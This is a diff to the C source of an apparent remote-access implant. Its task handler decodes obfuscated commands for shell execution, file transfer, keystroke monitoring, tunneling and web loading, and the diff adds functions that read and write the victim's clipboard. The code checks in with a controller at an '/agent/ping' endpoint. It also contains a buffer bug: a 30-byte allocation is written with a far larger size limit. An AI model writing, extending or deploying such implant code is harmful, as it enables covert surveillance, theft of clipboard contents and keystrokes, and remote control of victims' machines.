@@ -35,8 +35,10 @@
 // Max length for URL hostname, and path. Used for parsing.
 #define MAX_URL_HOST_LEN 256
 #define MAX_URL_PATH_LEN 512
-// Reconnection delay for TCP bridge (in secs)
+// Reconnection delay for TCP bridge in secs
 #define TCP_BRIDGE_RECONNECT_DELAY 5
+// Max number of chars to read from clipboard (clipread)
+#define MAX_CLIPBOARD_SIZE 1024000
 
 #ifdef IS_WINDOWS
   // Max file upload size
@@ -1255,8 +1257,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload"};
-  for (int i = 0; i < 12; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite"};
+  for (int i = 0; i < 14; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -1400,7 +1402,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
     tcp_bridge(striker, tsk, host1, port1, host2, port2);
     buffer_strcpy(result_buff, obfs_decode(strs[4]));
     tsk->successful = 1;
-  }else if (!strcmp(tsk->type, cmd_strs[11])){
+  }else if (!strcmp(tsk->type, cmd_strs[11])){ // Download a file from a URL
     char strs[][30] = {"[OBFS_ENC]url", "[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]File downloaded!", "[OBFS_ENC]Download failed!"};
     char *url = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
     char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
@@ -1414,6 +1416,46 @@ DWORD WINAPI task_executor(LPVOID ptr)
         buffer_strcpy(result_buff, obfs_decode(strs[3]));
       fclose(wfo);
     }
+  }else if (!strcmp(tsk->type, cmd_strs[12])){ // Read from clipboard
+    char err[] = "[OBFS_ENC]Error reading clipboard!";
+    #ifdef IS_LINUX
+      FILE *proc = popen("xclip -o 2>&1", "r");
+      if (!proc){
+        buffer_strcpy(result_buff, obfs_decode(err));
+        goto complete;
+      }
+      char *cliptext = malloc(MAX_CLIPBOARD_SIZE);
+      fgets(cliptext, MAX_CLIPBOARD_SIZE, proc);
+      pclose(proc);
+      buffer_strcpy(result_buff, cliptext);
+      free(cliptext);
+      tsk->successful = 1;
+    #else
+      buffer_strcpy(result_buff, obfs_decode(err));
+    #endif
+  }else if (!strcmp(tsk->type, cmd_strs[13])){
+    char msgs[][40] = {"[OBFS_ENC]Error writing to clipboard!", "[OBFS_ENC]Text written!"};
+    char *text = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "text"));
+    #ifdef IS_LINUX
+      char strs[][32] = {"[OBFS_ENC]cat ", "[OBFS_ENC]xclip -sel clip 2>&1"};
+      char *cmd = malloc(30);
+      snprintf(cmd, MAX_CLIPBOARD_SIZE - 1, "%s | %s", obfs_decode(strs[0]), obfs_decode(strs[1]));
+      FILE *proc = popen(cmd, "w");
+      free(cmd);
+      if (!proc){
+        buffer_strcpy(result_buff, obfs_decode(msgs[0]));
+        goto complete;
+      }
+      if (fwrite(text, 1, strlen(text), proc)){
+        buffer_strcpy(result_buff, obfs_decode(msgs[1]));
+        tsk->successful = 1;
+      }else{
+        buffer_strcpy(result_buff, obfs_decode(msgs[0]));
+      }
+      pclose(proc);
+    #else
+      buffer_strcpy(result_buff, obfs_decode(msgs[0]));
+    #endif
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -1497,7 +1539,7 @@ void start_session(){
           char *url = malloc(64);
           char fmt[] = "[OBFS_ENC]/agent/ping/%s";
           snprintf(url, 64, obfs_decode(fmt), striker->uid);
-          status_code = http_post(url, info, body);
+          status_code = http_get(url, body);
           free(url);
           fresh_conn = 0;
         }
